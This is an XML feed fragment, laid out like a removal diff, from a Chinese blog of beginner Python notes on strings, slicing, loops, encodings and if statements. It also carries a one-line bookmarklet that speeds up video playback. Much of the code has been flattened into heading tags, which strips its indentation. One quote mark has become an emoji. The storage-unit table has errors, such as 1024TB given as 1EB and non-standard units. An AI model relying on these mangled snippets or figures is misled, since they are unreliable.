-    </entry>
-    <entry>
-        <title type="html"><![CDATA[day03(str&&切片)]]></title>
-        <id>https://itxz.fun/post/day03strandqie-pian/</id>
-        <link href="https://itxz.fun/post/day03strandqie-pian/">
-        </link>
-        <updated>2020-04-22T09:24:16.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="s1-python全栈22期">s1 = 'python全栈22期'</h1>
-<h1 id="对字符串进行索引切片出来的数据都是字符串类型"># 对字符串进行索引，切片出来的数据都是字符串类型。</h1>
-<h1 id="按照索引取值"># 按照索引取值</h1>
-<h1 id="从左至右有顺序下标索引"># 从左至右有顺序，下标，索引。</h1>
-<h1 id="s2-s10">s2 = s1[0]</h1>
-<h1 id="prints2types2">print(s2,type(s2))</h1>
-<h1 id="s3-s12">s3 = s1[2]</h1>
-<h1 id="prints3">print(s3)</h1>
-<h1 id="s4-s1-1">s4 = s1[-1]</h1>
-<h1 id="prints4">print(s4)</h1>
-<h1 id=""></h1>
-<h1 id="按照切片取值"># 按照切片取值。</h1>
-<h1 id="顾头不顾腚"># 顾头不顾腚</h1>
-<h1 id="s5-s106">s5 = s1[0:6]</h1>
-<h1 id="s5-s16">s5 = s1[:6]</h1>
-<h1 id="prints5">print(s5)</h1>
-<h1 id="s6-s16">s6 = s1[6:]</h1>
-<h1 id="prints6">print(s6)</h1>
-<h1 id="-2"></h1>
-<h1 id="切片步长"># 切片步长</h1>
-<h1 id="s7-s152">s7 = s1[:5:2]</h1>
-<h1 id="prints7">print(s7)</h1>
-<h1 id="prints1">print(s1[:])</h1>
-<h1 id="倒序"># 倒序：</h1>
-<h1 id="s8-s1-1-6-1">s8 = s1[-1:-6:-1]</h1>
-<h1 id="prints8">print(s8)</h1>
-<h1 id="按索引s1index">按索引：s1[index]</h1>
-<h1 id="按照切片-s1start_index-end_index1">按照切片： s1[start_index: end_index+1]</h1>
-<h1 id="按照切片步长-s1start_index-end_index12">按照切片步长： s1[start_index: end_index+1:2]</h1>
-<h1 id="反向按照切片步长-s1start_index-end_index后延一位2">反向按照切片步长： s1[start_index: end_index后延一位:2]</h1>
-<h1 id="思考题倒序全部取出来">思考题：倒序全部取出来？</h1>
-<p>s = 'taiBAifdsa'</p>
-<h1 id="字符串的常用操作方法">字符串的常用操作方法</h1>
-<h1 id="不会对原字符串进行任何操作都是产生一个新的字符串">不会对原字符串进行任何操作，都是产生一个新的字符串</h1>
-<h1 id="upper-lower">upper lower</h1>
-<h1 id="s1-supper">s1 = s.upper()</h1>
-<h1 id="s1-slower"># s1 = s.lower()</h1>
-<h1 id="prints1types1">print(s1,type(s1))</h1>
-<h1 id="应用">应用：</h1>
-<h1 id="username-input用户名">username = input('用户名')</h1>
-<h1 id="password-input密码">password = input('密码')</h1>
-<h1 id="code-qwea">code = 'QweA'</h1>
-<h1 id="printcode">print(code)</h1>
-<h1 id="your_code-input请输入验证码不区分大小写">your_code = input('请输入验证码：不区分大小写')</h1>
-<h1 id="if-your_codeupper-codeupper">if your_code.upper() == code.upper():</h1>
-<h1 id="if-username-太白-and-password-123">if username == '太白' and password == '123':</h1>
-<h1 id="print登录成功">print('登录成功')</h1>
-<h1 id="else">else:</h1>
-<h1 id="print用户名密码错误">print('用户名密码错误')</h1>
-<h1 id="else-2">else:</h1>
-<h1 id="print验证码错误">print('验证码错误')</h1>
-<h1 id="-3"></h1>
-<h1 id="startswith-endswith">startswith endswith</h1>
-<h1 id="printsstartswitht">print(s.startswith('t'))  ***</h1>
-<h1 id="printsstartswithtaibai">print(s.startswith('taiBAi'))  ***</h1>
-<h1 id="了解">了解</h1>
-<h1 id="printsstartswithb36">print(s.startswith('B',3,6))</h1>
-<h1 id="replace">replace</h1>
-<p>msg = 'alex 很nb,alex是老男孩教育的创始人之一，alex长得很帅'</p>
-<h1 id="msg1-msgreplacealex太白-默认全部替换">msg1 = msg.replace('alex','太白')  # 默认全部替换</h1>
-<h1 id="msg1-msgreplacealex太白2">msg1 = msg.replace('alex','太白',2)</h1>
-<h1 id="printmsg">print(msg)</h1>
-<h1 id="printmsg1">print(msg1)</h1>
-<h1 id="strip空白空格t-n">strip:空白：空格，\t \n</h1>
-<h1 id="s4-n太白t">s4 = '  \n太白\t'</h1>
-<h1 id="prints4-2"># print(s4)</h1>
-<h1 id="s5-s4strip">s5 = s4.strip()</h1>
-<h1 id="prints5-2">print(s5)</h1>
-<h1 id="了解-2">了解</h1>
-<h1 id="可以去除指定的字符">可以去除指定的字符</h1>
-<h1 id="s4-rre太r白qsd">s4 = 'rre太r白qsd'</h1>
-<h1 id="s5-s4stripqrsed">s5 = s4.strip('qrsed')</h1>
-<h1 id="prints5-3">print(s5)</h1>
-<h1 id="split-非常重要">split  非常重要</h1>
-<h1 id="默认按照空格分隔返回一个列表">默认按照空格分隔，返回一个列表</h1>
-<h1 id="指定分隔符">指定分隔符</h1>
-<h1 id="str-list">str ---&gt; list</h1>
-<h1 id="s6-太白-女神-吴超">s6 = '太白 女神 吴超'</h1>
-<h1 id="s6-太白女神吴超">s6 = '太白:女神:吴超'</h1>
-<h1 id="l-s6split">l = s6.split('😂</h1>
-<h1 id="printl">print(l)</h1>
-<h1 id="了解-3">了解：</h1>
-<h1 id="s6-barrynvshenwu">s6 = ':barry:nvshen:wu'</h1>
-<h1 id="prints6split"># print(s6.split('😂)</h1>
-<h1 id="prints6split2">print(s6.split(&quot;:&quot;,2))</h1>
-<h1 id="join-非常好用">join 非常好用</h1>
-<h1 id="s1-alex">s1 = 'alex'</h1>
-<h1 id="s2-joins1">s2 = '+'.join(s1)</h1>
-<h1 id="prints2types2-2">print(s2,type(s2))</h1>
-<h1 id="l1-太白-女神-吴超">l1 = ['太白', '女神', '吴超']</h1>
-<h1 id="前提列表里面的元素必须都是str类型"># 前提：列表里面的元素必须都是str类型</h1>
-<h1 id="s3-joinl1">s3 = ':'.join(l1)</h1>
-<h1 id="prints3-2">print(s3)</h1>
-<h1 id="count">count</h1>
-<h1 id="s8-sdfsdagsfdagfdhgfhgfhfghfdagsaa">s8 = 'sdfsdagsfdagfdhgfhgfhfghfdagsaa'</h1>
-<h1 id="prints8counta">print(s8.count('a'))</h1>
-<h1 id="format-格式化输出">format: 格式化输出</h1>
-<h1 id="第一种用法"># 第一种用法：</h1>
-<h1 id="msg-我叫今年性别format大壮25男">msg = '我叫{}今年{}性别{}'.format('大壮',25,'男')</h1>
-<h1 id="第二种用法">第二种用法：</h1>
-<h1 id="msg-我叫0今年1性别2我依然叫0format大壮-25男">msg = '我叫{0}今年{1}性别{2}我依然叫{0}'.format('大壮', 25,'男')</h1>
-<h1 id="printmsg-2">print(msg)</h1>
-<h1 id="第三种用法">第三种用法：</h1>
-<h1 id="a-100">a = 100</h1>
-<h1 id="msg-我叫name今年age性别sexformatageasex男name大壮">msg = '我叫{name}今年{age}性别{sex}'.format(age=a,sex='男',name='大壮')</h1>
-<h1 id="printmsg-3">print(msg)</h1>
-<h1 id="is-系列">is 系列：</h1>
-<h1 id="name-taibai123">name = 'taibai123'</h1>
-<h1 id="name-1001">name = '100①'</h1>
-<h1 id="printnameisalnum-字符串由字母或数字组成"># print(name.isalnum()) #字符串由字母或数字组成</h1>
-<h1 id="printnameisalpha-字符串只由字母组成"># print(name.isalpha()) #字符串只由字母组成</h1>
-<h1 id="printnameisdecimal-字符串只由十进制组成">print(name.isdecimal()) #字符串只由十进制组成</h1>
-<h1 id="s1-input请输入您的金额">s1 = input('请输入您的金额：')</h1>
-<h1 id="if-s1isdecimal">if s1.isdecimal():</h1>
-<h1 id="printints1">print(int(s1))</h1>
-<h1 id="else-3">else:</h1>
-<h1 id="print输入有误">print('输入有误')</h1>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[pythonday03（作业）]]></title>
-        <id>https://itxz.fun/post/pythonday03zuo-ye/</id>
-        <link href="https://itxz.fun/post/pythonday03zuo-ye/">
-        </link>
-        <updated>2020-04-22T09:20:20.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="while-true"># while True:</h1>
-<h1 id="print1">#     print(1)</h1>
-<h1 id=""></h1>
-<h1 id="-2"></h1>
-<h1 id="-3">'''</h1>
-<h1 id="如何终止循环">如何终止循环？</h1>
-<h1 id="1标志位">1，标志位</h1>
-<h1 id="-4">'''</h1>
-<h1 id="n-true"># n = True</h1>
-<h1 id="while-n"># while n:</h1>
-<h1 id="print111">#     print(111)</h1>
-<h1 id="print222">#     print(222)</h1>
-<h1 id="n-false">#     n = False</h1>
-<h1 id="print333">#     print(333)</h1>
-<h1 id="-5"></h1>
-<h1 id="break-直接终止循环"># break: 直接终止循环</h1>
-<h1 id="continue终止本次循环继续下一次循环"># continue：终止本次循环，继续下一次循环</h1>
-<h1 id="-6">'''</h1>
-<h1 id="while-else">while  else:</h1>
-<h1 id="-7">'''</h1>
-<h1 id="-8"></h1>
-<h1 id="-9"></h1>
-<h1 id="day2作业及默写">Day2作业及默写</h1>
-<h1 id="-10"></h1>
-<h1 id="1-判断下列逻辑语句的truefalse">1. 判断下列逻辑语句的True,False.</h1>
-<h1 id="11-1-or-3-4-or-4-5-and-2-1-and-9-8-or-7-6">1）1 &gt; 1 or 3 &lt; 4 or 4 &gt; 5 and 2 &gt; 1 and 9 &gt; 8 or 7 &lt; 6</h1>
-<h1 id="2not-2-1-and-3-4-or-4-5-and-2-1-and-9-8-or-7-6">2）not 2 &gt; 1 and 3 &lt; 4 or 4 &gt; 5 and 2 &gt; 1 and 9 &gt; 8 or 7 &lt; 6</h1>
-<h1 id="2-求出下列逻辑语句的值">2. 求出下列逻辑语句的值。</h1>
-<h1 id="18-or-3-and-4-or-2-and-0-or-9-and-7">1),8 or 3 and 4 or 2 and 0 or 9 and 7</h1>
-<h1 id="20-or-2-and-3-and-4-or-6-and-0-or-3">2),0 or 2 and 3 and 4 or 6 and 0 or 3</h1>
-<h1 id="3-下列结果是什么">3. 下列结果是什么？</h1>
-<h1 id="1-6-or-2-1">1)、6 or 2 &gt; 1</h1>
-<h1 id="2-3-or-2-1">2)、3 or 2 &gt; 1</h1>
-<h1 id="3-0-or-5-4">3)、0 or 5 &lt; 4</h1>
-<h1 id="4-5-4-or-3">4)、5 &lt; 4 or 3</h1>
-<h1 id="5-2-1-or-6">5)、2 &gt; 1 or 6</h1>
-<h1 id="6-3-and-2-1">6)、3 and 2 &gt; 1</h1>
-<h1 id="7-0-and-3-1">7)、0 and 3 &gt; 1</h1>
-<h1 id="8-2-1-and-3">8)、2 &gt; 1 and 3</h1>
-<h1 id="9-3-1-and-0">9)、3 &gt; 1 and 0</h1>
-<h1 id="10-3-1-and-2-or-2-3-and-3-and-4-or-3-2">10)、3 &gt; 1 and 2 or 2 &lt; 3 and 3 and 4 or 3 &gt; 2</h1>
-<h1 id="4-while循环语句基本结构">4. while循环语句基本结构？</h1>
-<h1 id="5-利用while语句写出猜大小的游戏">5. 利用while语句写出猜大小的游戏：</h1>
-<h1 id="设定一个理想数字比如66让用户输入数字如果比66大则显示猜测的结果大了如果比66小则显示猜测的结果小了只有等于66显示猜测结果正确然后退出循环">设定一个理想数字比如：66，让用户输入数字，如果比66大，则显示猜测的结果大了；如果比66小，则显示猜测的结果小了;只有等于66，显示猜测结果正确，然后退出循环。</h1>
-<h1 id="6-在5题的基础上进行升级">6. 在5题的基础上进行升级：</h1>
-<h1 id="给用户三次猜测机会如果三次之内猜测对了">给用户三次猜测机会，如果三次之内猜测对了，</h1>
-<h1 id="则显示猜测正确退出循环">则显示猜测正确，退出循环，</h1>
-<h1 id="如果三次之内没有猜测正确">如果三次之内没有猜测正确，</h1>
-<h1 id="则自动退出循环并显示太笨了你">则自动退出循环，并显示‘太笨了你....’。</h1>
-<h1 id="while">while</h1>
-<h1 id="3-次">3 次</h1>
-<h1 id="input">input</h1>
-<h1 id="if-elif-else">if elif else</h1>
-<h1 id="count-1">count = 1</h1>
-<h1 id="while-count-4">while count &lt; 4:</h1>
-<h1 id="num-intinput请输入数字">num = int(input('请输入数字：'))</h1>
-<h1 id="if-num-66">if num &gt; 66:</h1>
-<h1 id="print猜大了">print('猜大了')</h1>
-<h1 id="elif-num-66">elif num &lt; 66:</h1>
-<h1 id="print猜小了">print('猜小了')</h1>
-<h1 id="else">else:</h1>
-<h1 id="print恭喜你猜对了">print('恭喜你猜对了')</h1>
-<h1 id="break">break</h1>
-<h1 id="count-1-2">count += 1</h1>
-<h1 id="else-2">else:</h1>
-<h1 id="print太笨了">print('太笨了')</h1>
-<h1 id="7-使用while循环输出-1-2-3-4-5-6-8-9-10">7. 使用while循环输出 1 2 3 4 5 6 8 9 10</h1>
-<h1 id="count-1-3">count = 1</h1>
-<h1 id="while-count-11">while count &lt; 11:</h1>
-<h1 id="if-count-7">if count == 7:</h1>
-<h1 id="print">print('')</h1>
-<h1 id="else-3">else:</h1>
-<h1 id="printcount">print(count)</h1>
-<h1 id="count-1-4">count += 1</h1>
-<h1 id="count-1-5">count = 1</h1>
-<h1 id="while-count-11-2">while count &lt; 11:</h1>
-<h1 id="if-count-7-2">if count == 7:</h1>
-<h1 id="pass">pass</h1>
-<h1 id="else-4">else:</h1>
-<h1 id="printcount-2">print(count)</h1>
-<h1 id="count-1-6">count += 1</h1>
-<h1 id="count-1-7">count = 1</h1>
-<h1 id="while-count-11-3"># while count &lt; 11:</h1>
-<h1 id="if-count-7-3">#     if count == 7:</h1>
-<h1 id="count-1-8">#         count += 1</h1>
-<h1 id="printcount-3">#     print(count)</h1>
-<h1 id="count-1-9">#     count += 1</h1>
-<h1 id="count-0">count = 0</h1>
-<h1 id="while-count-10">while count &lt; 10:</h1>
-<h1 id="count-1-10">count += 1</h1>
-<h1 id="if-count-7-4">if count == 7:</h1>
-<h1 id="continue">continue</h1>
-<h1 id="printcount-4">print(count)</h1>
-<h1 id="8-求1-100的所有数的和">8. 求1-100的所有数的和</h1>
-<h1 id="9-输出-1-100-内的所有奇数">9. 输出 1-100 内的所有奇数</h1>
-<h1 id="10-输出-1-100-内的所有偶数">10. 输出 1-100 内的所有偶数</h1>
-<h1 id="11-求1-23-45-99的所有数的和">11. 求1-2+3-4+5 ... 99的所有数的和</h1>
-<h1 id="count-1-11">count = 1</h1>
-<h1 id="s-0">s = 0</h1>
-<h1 id="while-count-100">while count &lt; 100:</h1>
-<h1 id="if-count-2-0">if count % 2 == 0:</h1>
-<h1 id="s-s-count">s = s - count</h1>
-<h1 id="else-5">else:</h1>
-<h1 id="s-s-count-2">s = s + count</h1>
-<h1 id="count-1-12">count += 1</h1>
-<h1 id="prints">print(s)</h1>
-<h1 id="12-用户登录三次输错机会且每次输错误时显示剩余错误次数提示使用字符串格式化">12. 用户登录（三次输错机会）且每次输错误时显示剩余错误次数（提示：使用字符串格式化）</h1>
-<h1 id="count-1-13">count = 1</h1>
-<h1 id="while-count-3">while count &lt;= 3:</h1>
-<h1 id="username-input用户名">username = input('用户名')</h1>
-<h1 id="password-input密码">password = input('密码')</h1>
-<h1 id="if-username-alex-and-password-123">if username == 'alex' and password == '123':</h1>
-<h1 id="print登录成功">print('登录成功')</h1>
-<h1 id="else-6">else:</h1>
-<h1 id="print用户名或者密码错误还剩s机会-3-count">print('用户名或者密码错误,还剩%s机会' % (3-count))</h1>
-<h1 id="count-count-1">count = count + 1</h1>
-<h1 id="13-简述ascii-unicode-utf-8编码">13. 简述ASCII、Unicode、utf-8编码</h1>
-<h1 id="14-简述位和字节的关系">14. 简述位和字节的关系？</h1>
-<h1 id="-11"></h1>
-<h1 id="-12"></h1>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[度盘倍速方法]]></title>
-        <id>https://itxz.fun/post/du-pan-bei-su-fang-fa/</id>
-        <link href="https://itxz.fun/post/du-pan-bei-su-fang-fa/">
-        </link>
-        <updated>2020-04-20T01:28:29.000Z</updated>
-        <content type="html"><![CDATA[<p>javascript:videojs.getPlayers(&quot;video-player&quot;) .html5player.tech_.setPlaybackRate(2)</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[python02]]></title>
-        <id>https://itxz.fun/post/python02/</id>
-        <link href="https://itxz.fun/post/python02/">
-        </link>
-        <updated>2020-04-10T09:43:46.000Z</updated>
-        <content type="html"><![CDATA[<p>day02<br>
-day2 内容大纲</p>
-<ol>
-<li>
-<h2 id="今日内容大纲">今日内容大纲</h2>
-<ul>
-<li>pycharm的安装以及简单使用
-<ul>
-<li>辅助开发软件，代码逐行调试，设置高端，不会提示，你在书写代码时，他不提示，debug的模式，最好用的还是pycharm。</li>
-</ul>
-</li>
-<li><strong>格式化输出</strong></li>
-<li><strong>while循环</strong></li>
-<li>运算符  and or not</li>
-<li>编码的初识</li>
-</ul>
-</li>
-<li>
-<h2 id="昨日内容回顾">昨日内容回顾</h2>
-<ul>
-<li>
-<p>编译型与解释型</p>
-<ul>
-<li>编译型：一次性编译成2进制，在执行
-<ul>
-<li>优点：执行效率高</li>
-<li>缺点：不能跨平台，开发效率低</li>
-<li>代表语言：C</li>
-</ul>
-</li>
-<li>解释型：逐行解释成二进制，在执行
-<ul>
-<li>优点：可以跨平台，开发效率高</li>
-<li>缺点：执行效率低。
-<ul>
-<li>代表语言：python</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>
-<p>变量：</p>
-<ul>
-<li>
-<p>数字，字母，下划线任意组合。</p>
-</li>
-<li>
-<p>不能以数字开头。</p>
-</li>
-<li>
-<p>不能用Python的关键字：print if...</p>
-</li>
-<li>
-<p>不能使用中文。</p>
-</li>
-<li>
-<p>描述性。</p>
-</li>
-<li>
-<p>区分变量与数据类型的区别。</p>
-</li>
-<li>
-<pre><code class="language-python">name = 'Alex'
-name = '太白'
-print(name)
-name = 'wusir'
-print(name)
-</code></pre>
-</li>
-</ul>
-</li>
-<li>
-<p>常量</p>
-<ul>
-<li>一直不变的量，与变量几乎一样。</li>
-</ul>
-</li>
-<li>
-<p>注释：解释说明</p>
-</li>
-<li>
-<p>基础数据类型：</p>
-<ul>
-<li>1， 2， 3， 4000，int 数字， +-*/ % ** ....</li>
-<li>'fdsalk中国'   str  字符串  +   *int</li>
-<li>True False   bool 布尔值</li>
-</ul>
-</li>
-<li>
-<p>用户输入input</p>
-</li>
-<li>
-<pre><code>name = input('&gt;&gt;&gt;')
-print(type(name))
-</code></pre>
-</li>
-<li>
-<p>if</p>
-<ul>
-<li>
-<p>if  条件:</p>
-</li>
-<li>
-<p>if  else:</p>
-</li>
-<li>
-<p>if elif elif .....</p>
-</li>
-<li>
-<p>if elif elif ..... else</p>
-</li>
-<li>
-<p>if  嵌套</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<h2 id="3-今日内容">3. 今日内容</h2>
-<ol>
-<li>
-<p>while 循环</p>
-<ul>
-<li>
-<p>why：大气循环， 吃饭，上课，睡觉，日复一日，歌曲列表循序环，程序中：输入用户名密码，</p>
-</li>
-<li>
-<p>what：while 无限循环。</p>
-</li>
-<li>
-<p>how：</p>
-<ol>
-<li>
-<p>基本结构：</p>
-<pre><code class="language-python">while 条件:
-    循环体
-</code></pre>
-</li>
-<li>
-<p>初识循环</p>
-<pre><code class="language-python">while True:
-    print('狼的诱惑')
-    print('我们不一样')
-    print('月亮之上')
-    print('庐州月')
-    print('人间')
-    
-</code></pre>
-</li>
-<li>
-<p>基本原理：</p>
-<figure data-type="image" tabindex="1"><img src="C:%5CUsers%5Coldboy%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1556418225772.png" alt="1556418225772" loading="lazy"></figure>
-</li>
-<li>
-<p>循环如何终止？</p>
-<ol>
-<li>
-<p>改变条件。</p>
-<pre><code class="language-python">flag = True
-while flag:
-    print('狼的诱惑')
-    print('我们不一样')
-    print('月亮之上')
-    flag = False
-    print('庐州月')
-    print('人间')
-
-</code></pre>
-<pre><code class="language-python"># 练习题： 1~ 100 所有的数字
-count = 1
-flag = True
-while flag:
-    print(count)
-    count = count + 1
-    if count == 101:
-        flag = False
-        
-count = 1
-while count &lt; 101:
-    print(count)
-    count = count + 1
-
-</code></pre>
-<pre><code class="language-python"># 1 + 2 + 3 + ...... 100  的最终结果：
-
-s = 0
-count = 1
-while count &lt; 101:
-    s = s + count
-    count = count + 1
-print(s)
-
-</code></pre>
-</li>
-</ol>
-<p>​</p>
-<ol start="2">
-<li>break</li>
-</ol>
-<pre><code class="language-python"># while True:
-#     print('狼的诱惑')
-#     print('我们不一样')
-#     print('月亮之上')
-#     break
-#     print('庐州月')
-#     print('人间')
-# print(111)
-</code></pre>
-<ol start="3">
-<li>
-<p>系统命令（今天不讲）</p>
-</li>
-<li>
-<p>continue</p>
-<pre><code class="language-python"># continue ： 退出本次循环，继续下一次循环
-flag = True
-while flag:
-    print(111)
-    print(222)
-    flag = False
-    continue
-    print(333)
-
-</code></pre>
-<pre><code class="language-python"># while else： while 循环如果被break打断，则不执行else语句。
-count = 1
-while count &lt; 5:
-    print(count)
-    if count == 2:
-        break
-    count = count + 1
-else:
-    print(666)
-</code></pre>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>
-<p>where： 你需要重复之前的动作，输入用户名密码，考虑到while循环。</p>
-</li>
-</ul>
-</li>
-<li>
-<p>格式化输出</p>
-<ul>
-<li>当你遇到这样的需求：字符串中想让某些位置变成动态可传入的，首先要考虑到格式化输出。</li>
-</ul>
-</li>
-<li>
-<p>运算符：算数运算符 + -，比较运算符 &gt; ==，赋值运算符=,+=,逻辑运算符，and or， 成员运算符。</p>
-<pre><code class="language-python">i1 = 2
-i2 = 3
-print(2 ** 3)
-print(10 // 3)
-print(10 % 3)
-
-print(3 != 4)
-
-count = 1
-count = count + 1
-count += 1
-print(count)
-
-</code></pre>
-<pre><code class="language-python"># and or not
-
-# 1 在没有()的情况下，优先级：not &gt; and &gt; or，同一优先级从左至右依次计算
-# 情况1：两边都是比较运算
-# print(2 &gt; 1 and 3 &lt; 4 or 4 &gt; 5 and 2 &lt; 1)
-# print(True or False)
-
-# 情况2：两边都是整数
-'''
-x or y , x为真，值就是x，x为假，值是y
-'''
-# print(1 or 2)
-# print(3 or 2)
-# print(4 or 2)
-# print(-1 or 2)
-# print(0 or 2)
-
-# print(1 and 2)
-
-</code></pre>
-<p>数据类型之间的转换</p>
-<pre><code class="language-python"># str ---&gt; int  : 只能是纯数字组成的字符串
-s1 = '00100'
-print(int(s1))
-# int ----&gt; str
-i1 = 100
-print(str(i1),type(str(i1)))
-
-# int  ---&gt; bool  : 非零即True ，0为False。
-i = 0
-print(bool(i))
-# bool ---&gt; int
-print(int(True))  # 1
-print(int(False))  # 0
-
-</code></pre>
-</li>
-<li>
-<p>编码的初识<strong>重点</strong></p>
-</li>
-</ol>
-<p>计算机存储文件，存储数据，以及将一些数据信息通过网络发送出去，存储发送数据什么内容？底层都是01010101.</p>
-<p>我带这张珵穿越，1937，我俩研究电报：</p>
-<p>真正密码本：</p>
-<p>​		滴滴      走</p>
-<p>​	滴滴滴       跑</p>
-<p>第一版： 没有段位，</p>
-<p>​	101		     今</p>
-<p>​	1101            晚</p>
-<p>​	1                吃</p>
-<p>​	11		     鸡</p>
-<p>1011101111</p>
-<p>第二版：</p>
-<p>​	0000101		     今</p>
-<p>​	0001101             晚</p>
-<p>​	0000001             吃</p>
-<p>​	0000011		     鸡</p>
-<p>0000101	0001101	0000001	0000011</p>
-<p>密码本：01010110 二进制与 文字之间的对应关系。</p>
-<p>最早起的密码本：</p>
-<p>​	ASCII码：只包含：英文字母，数字，特殊字符。</p>
-<p>0000 0001  ：             a</p>
-<p>0000 0101  ：             ;</p>
-<p>8bit == 1byte</p>
-<p>'hello123':   8byte</p>
-<p>gbk: 英文字母，数字，特殊字符和中文。国标</p>
-<p>一个英文字母：      0000 0001  ：             a</p>
-<p>一个中文 中：        0000 0001  0100 0001  ： 中</p>
-<p>Unicode: 万国码：把世界上所有的文字都记录到这个密码本。</p>
-<p>​	起初一个字符用2个字节表示：</p>
-<p>0000 0001  0000 0011：             a</p>
-<p>0000 0001  0100 0001  ：           中</p>
-<p>后来为了涵盖全部文字：</p>
-<p>0000 0001  0000 0011  0000 0001  0000 0011：             a</p>
-<p>0000 0001  0100 0001  0000 0001  0000 0011  ：           中</p>
-<p>浪费空间，浪费资源。</p>
-<p>Utf-8:升级：最少用8bit1个字节表示一个字符。</p>
-<p>​	0000 0011：             				a   1字节</p>
-<p>​	0000 0011 0000 0011   		欧洲 2个字节</p>
-<p>0000 0011 0000 0011 0000 0011         中： 3个字节。</p>
-<h1 id="重点"><strong>重点：</strong></h1>
-<p>'中国12he'  ： GBK:    8个字节</p>
-<p>'中国12he'  ： UTF-8:    10个字节</p>
-<pre><code>8bit = 1byte
-1024byte = 1KB
-1024KB = 1MB
-1024MB = 1GB
-1024GB = 1TB
-1024TB = 1PB
-1024TB = 1EB
-1024EB = 1ZB
-1024ZB = 1YB
-1024YB = 1NB
-1024NB = 1DB    
-</code></pre>
-<p>7.6MB  ----&gt; 7.6 * 1024 * 1024 * 8</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[python]]></title>
-        <id>https://itxz.fun/post/python/</id>
-        <link href="https://itxz.fun/post/python/">
-        </link>
-        <updated>2020-04-10T09:34:25.000Z</updated>
-        <content type="html"><![CDATA[<p>day01<br>
-. 用户交互input</p>
-<pre><code>why:	网页上，app 输入账号与密码。
-
-what： 用户交互input
-
-how：
-
-```python
-# input: 出来的全部都是字符串类型。
-username = input('请输入用户名：')
-password = input('请输入密码：')
-print(username,type(username))
-print(password,type(password))
-```
-</code></pre>
-<p>流程控制语句if</p>
-<pre><code>why:  生活中选择，回家，n条路，你走那条路，取决于心情。
-
-what: if。
-
-how：
-
-+ 基本结构：
-
-+ ```
-  if 条件:
-      结果
-      
-  # c: if{条件}{结果}
-  ```
-
-1.  单独if
-
-   ```python
-   print(111)
-   if 2 &lt; 1:
-       print(666)
-       print(333)
-   print(222)
-   ```
-
-   
-
-2. if else 二选一
-
-   ```python 
-   s1 = '100'
-   i1 = int(s1)
-   print(i1,type(l1))
-   
-   age = input('请输入年龄：')
-   if int(age) &gt; 18:
-       print('恭喜你，成年了')
-   else:
-       print('小屁孩儿')
-   
-   ```
-
-3. if elif elif .... 多选一
-
-   ```python
-   num = int(input('猜点数：'))
-   
-   if num == 1:
-       print('晚上请你吃饭')
-   elif num == 3:
-       print('一起溜达')
-   elif num == 2:
-       print('请你大宝剑')
-   ```
-
-   
-
-4. if elif elif .... else 多选一
-
-   ```python
-   num = int(input('猜点数：'))
-   
-   if num == 1:
-       print('晚上请你吃饭')
-   	
-   elif num == 3:
-       print('一起溜达')
-   	
-   elif num == 2:
-       print('请你大宝剑')
-   else:
-       print('太笨了....')
-   
-   print('组合')
-   ```
-
-   
-
-5. 嵌套的if
-
-   ```python
-   
-   username = input('请输入用户名：')
-   password = input('请输入密码：')
-   code = 'qwer'
-   your_code = input('请输入验证码：')
-   
-   if your_code == code:
-       if username == 'taibai' and password == '123':
-   	    print('登录成功')
-       else:
-   	    print('账号或者密码错误')
-   else:
-       print('验证码错误')
-   ```</code></pre>
 ]]></content>
     </entry>
 </feed>
